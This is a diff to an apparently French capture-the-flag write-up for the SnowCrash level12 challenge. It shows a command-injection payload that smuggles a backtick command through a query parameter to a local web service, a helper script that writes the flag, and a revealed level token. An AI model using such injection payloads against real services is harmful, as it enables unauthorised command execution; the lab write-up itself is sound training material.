@@ -58,7 +58,7 @@ n(t(param("x"), param("y")));
 level12@SnowCrash:~$ vim /tmp/GETFLAG
 level12@SnowCrash:~$ cat /tmp/GETFLAG
 #!/bin/bash
-getflag > /tmp/flag
+getflag > /tmp/flag12
 level12@SnowCrash:~$ chmod +x /tmp/GETFLAG
 ```
 
@@ -72,10 +72,10 @@ on peut executer la commande
 
 connect to
 
-> http://192.168.56.101:4646/?x=`/tmp/GETFLAG`
+> curl 'http://127.0.0.1:4646/?x="`/*/GETFLAG`"'
 
 ```zsh
-level12@SnowCrash:~$ cat /tmp/flag
+level12@SnowCrash:~$ cat /tmp/flag12
 Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
 level12@SnowCrash:~$ su level13
 Password:
